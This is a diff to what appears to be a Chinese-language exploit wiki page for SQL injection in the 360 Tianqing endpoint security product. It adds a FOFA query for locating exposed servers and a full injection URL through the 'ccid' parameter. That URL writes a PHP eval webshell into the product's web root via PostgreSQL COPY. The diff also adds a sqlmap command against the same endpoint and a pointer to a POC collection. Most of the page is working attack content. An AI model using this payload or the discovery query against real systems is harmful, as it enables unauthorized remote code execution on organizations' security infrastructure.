@@ -10,11 +10,16 @@
 >
 > 天擎
 
+## FOFA
+
+> [!NOTE]
+> title="360新天擎"
+
 ## 漏洞复现
 
 ```
 注入写shell:
-https://192.168.24.196:8443/api/dp/rptsvcsyncpoint... table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
+https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--  
 
 
 利用过程:
@@ -25,3 +30,20 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint... table O(T TEXT);insert int
 5. 删除 表O
 ```
 
+使用命令
+
+```
+sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
+```
+
+![](image/tq-1.png)
+
+## Goby & POC
+
+> [!NOTE]
+>
+> 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
+>
+> 360 TianQing ccid SQL injectable
+
+![](image/tq-4.png)
